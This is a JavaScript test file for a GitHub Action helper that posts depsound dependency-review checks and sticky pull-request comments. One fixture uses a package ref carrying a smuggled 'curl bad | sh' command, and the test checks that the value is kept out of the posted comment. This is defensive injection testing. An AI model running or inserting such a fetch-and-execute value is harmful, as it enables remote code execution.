'use strict';

const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const test = require('node:test');
const { postReport } = require('./post.cjs');

function fixture(files = {}) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'depsound-post-'));
  for (const [name, content] of Object.entries(files)) fs.writeFileSync(path.join(dir, name), content);
  return dir;
}

function client({ comments = [], head = 'head', failCheck = false, failComment = false } = {}) {
  const calls = [];
  const github = {
    rest: {
      checks: {
        listForRef: async options => { calls.push(['listCheck', options]); if (failCheck) throw Error('check offline'); return { data: { check_runs: [] } }; },
        create: async options => { calls.push(['createCheck', options]); },
        update: async options => { calls.push(['updateCheck', options]); },
      },
      pulls: { get: async options => { calls.push(['getPull', options]); return { data: { head: { sha: head } } }; } },
      issues: {
        listComments: async options => { calls.push(['listComments', options]); return { data: comments }; },
        createComment: async options => { calls.push(['createComment', options]); if (failComment) throw Error('comment offline'); },
        updateComment: async options => { calls.push(['updateComment', options]); if (failComment) throw Error('comment offline'); },
      },
    },
    paginate: async (method, options) => { await method(options); return comments; },
  };
  return { github, calls };
}

function runtime(github) {
  const warnings = [];
  const failures = [];
  return {
    github,
    context: {
      repo: { owner: 'o', repo: 'r' }, serverUrl: 'https://github.test', runId: 7,
      payload: { pull_request: { number: 4, head: { sha: 'head' } } },
    },
    core: { warning: warning => warnings.push(warning), setFailed: failure => failures.push(failure) },
    warnings,
    failures,
  };
}

const complete = (extra = {}) => ({ state: 'complete', headSha: 'head', version: 'v0.37.0', title: 'depsound: flagged for review', ...extra });
const bulk = (extra = {}) => ({ schema: 1, toolVersion: '0.37.0', mode: 'bulk', items: [{ ecosystem: 'npm', name: 'x', to: '1.0.0' }], ...extra });

test('no-change creates a neutral current-head check and scoped sticky comment', async () => {
  const dir = fixture({ 'meta.json': JSON.stringify({ state: 'no-changes', headSha: 'head' }) });
  const mock = client();
  await postReport({ ...runtime(mock.github), fs, reportDir: dir });
  assert.equal(mock.calls.find(([kind]) => kind === 'createCheck')[1].head_sha, 'head');
  assert.equal(mock.calls.some(([kind]) => kind === 'createComment'), true);
});

test('reverting dependency changes replaces the prior flagged sticky comment', async () => {
  const dir = fixture({ 'meta.json': JSON.stringify({ state: 'no-changes', headSha: 'head' }) });
  const mock = client({ comments: [{ id: 42, user: { type: 'Bot' }, body: '<!-- depsound-title: old -->\nold flagged finding\n<!-- depsound -->' }] });
  await postReport({ ...runtime(mock.github), fs, reportDir: dir });
  const update = mock.calls.find(([kind]) => kind === 'updateComment')[1];
  assert.equal(update.comment_id, 42);
  assert.doesNotMatch(update.body, /old flagged finding/);
  assert.match(update.body, /no dependency changes/);
  assert.match(update.body, /<!-- depsound-title:/);
});

test('missing or corrupt envelope posts incomplete neutral check and comment', async () => {
  for (const source of [{}, { 'meta.json': '{' }]) {
    const dir = fixture(source);
    const mock = client();
    const run = runtime(mock.github);
    await postReport({ ...run, fs, reportDir: dir });
    assert.equal(mock.calls.some(([kind]) => kind === 'createCheck'), true);
    const comment = mock.calls.find(([kind]) => kind === 'createComment')[1].body;
    assert.match(comment, /analysis incomplete/);
    assert.deepEqual(mock.calls.find(([kind]) => kind === 'createCheck')[1].conclusion, 'neutral');
  }
});

test('incomplete envelope posts incomplete without reading report bytes', async () => {
  const dir = fixture({ 'meta.json': JSON.stringify({ state: 'incomplete' }), 'comment.md': 'ignored' });
  const mock = client();
  await postReport({ ...runtime(mock.github), fs, reportDir: dir });
  const comment = mock.calls.find(([kind]) => kind === 'createComment')[1].body;
  assert.match(comment, /analysis incomplete/);
  assert.doesNotMatch(comment, /ignored/);
});

test('missing or empty rendered report becomes incomplete', async () => {
  for (const extra of [{}, { 'comment.md': ' \n' }]) {
    const dir = fixture({ 'meta.json': JSON.stringify(complete()), ...extra });
    const mock = client();
    await postReport({ ...runtime(mock.github), fs, reportDir: dir });
    const comment = mock.calls.find(([kind]) => kind === 'createComment')[1].body;
    assert.match(comment, /analysis incomplete/);
  }
});

test('check and comment failures remain independent', async () => {
  const dir = fixture({ 'meta.json': JSON.stringify({ state: 'incomplete' }) });
  const mock = client({ failCheck: true, failComment: true });
  const run = runtime(mock.github);
  await postReport({ ...run, fs, reportDir: dir });
  assert.equal(mock.calls.some(([kind]) => kind === 'createComment'), true);
  assert.equal(run.failures.length, 1);
  assert.match(run.failures[0], /check: check offline; comment: comment offline/);
});

test('replay comes only from a valid typed packet, never a display ref', async () => {
  const dir = fixture({
    'meta.json': JSON.stringify(complete()),
    'comment.md': '<!-- depsound-title: depsound: flagged for review -->\nbody\n<!-- depsound -->',
    'report.json': JSON.stringify([{ ref: "npm:evil x; curl bad | sh -> y" }]),
    'review-input.json': JSON.stringify(bulk()),
  });
  const mock = client();
  await postReport({ ...runtime(mock.github), fs, reportDir: dir });
  const body = mock.calls.find(([kind]) => kind === 'createComment')[1].body;
  assert.match(body, /'github.com\/rvagg\/depsound\/cmd\/depsound@v0.37.0'/);
  assert.doesNotMatch(body, /curl bad/);
  assert.doesNotMatch(body, /npm:evil/);
});

test('evidence-only and missing packet offer inspection without false replay', async () => {
  for (const packet of [undefined, { schema: 1, toolVersion: 'v0.37.0', mode: 'evidence' }]) {
    const files = {
      'meta.json': JSON.stringify(complete()),
      'comment.md': 'body\n<!-- depsound -->',
    };
    if (packet) files['review-input.json'] = JSON.stringify(packet);
    const dir = fixture(files);
    const mock = client();
    await postReport({ ...runtime(mock.github), fs, reportDir: dir });
    const body = mock.calls.find(([kind]) => kind === 'createComment')[1].body;
    assert.match(body, /href="https:\/\/github.test\/o\/r\/actions\/runs\/7"/);
    assert.doesNotMatch(body, /github\.com\/rvagg\/depsound\/cmd\/depsound@/);
  }
});

test('malformed, schema-mismatched, and version-mismatched packets are incomplete', async () => {
  for (const packet of ['{', { schema: 2, toolVersion: '0.37.0', mode: 'bulk', items: [] }, bulk({ toolVersion: '0.38.0' }), bulk({ items: [{ lockChange: true }] })]) {
    const dir = fixture({
      'meta.json': JSON.stringify(complete()),
      'comment.md': 'body\n<!-- depsound -->',
      'review-input.json': typeof packet === 'string' ? packet : JSON.stringify(packet),
    });
    const mock = client();
    await postReport({ ...runtime(mock.github), fs, reportDir: dir });
    const body = mock.calls.find(([kind]) => kind === 'createComment')[1].body;
    assert.match(body, /analysis incomplete/);
  }
});

test('oversize markdown is replaced with a bounded artifact route', async () => {
  const dir = fixture({
    'meta.json': JSON.stringify(complete()),
    'comment.md': `${'界'.repeat(30000)}\n<!-- depsound -->`,
    'review-input.json': JSON.stringify(bulk()),
  });
  const mock = client();
  await postReport({ ...runtime(mock.github), fs, reportDir: dir });
  const body = mock.calls.find(([kind]) => kind === 'createComment')[1].body;
  assert.ok(Buffer.byteLength(body, 'utf8') <= 60000);
  assert.match(body, /<!-- depsound -->/);
  assert.match(body, /https:\/\/github.test\/o\/r\/actions\/runs\/7/);
});

test('older head keeps its per-SHA neutral check but cannot update a comment', async () => {
  const dir = fixture({ 'meta.json': JSON.stringify({ state: 'incomplete' }) });
  const mock = client({ head: 'new-head' });
  await postReport({ ...runtime(mock.github), fs, reportDir: dir });
  assert.equal(mock.calls.some(([kind]) => kind === 'createCheck'), true);
  assert.equal(mock.calls.some(([kind]) => kind === 'createComment' || kind === 'updateComment'), false);
});

test('only a bot marked comment is adopted', async () => {
  const dir = fixture({ 'meta.json': JSON.stringify({ state: 'incomplete' }) });
  const mock = client({ comments: [
    { id: 1, body: '<!-- depsound-title: old -->\n<!-- depsound -->', user: { type: 'User' } },
    { id: 3, body: '<!-- depsound -->', user: { type: 'Bot' } },
    { id: 2, body: '<!-- depsound-title: old -->\n<!-- depsound -->', user: { type: 'Bot' } },
  ] });
  await postReport({ ...runtime(mock.github), fs, reportDir: dir });
  const update = mock.calls.find(([kind]) => kind === 'updateComment');
  assert.equal(update[1].comment_id, 2);
});
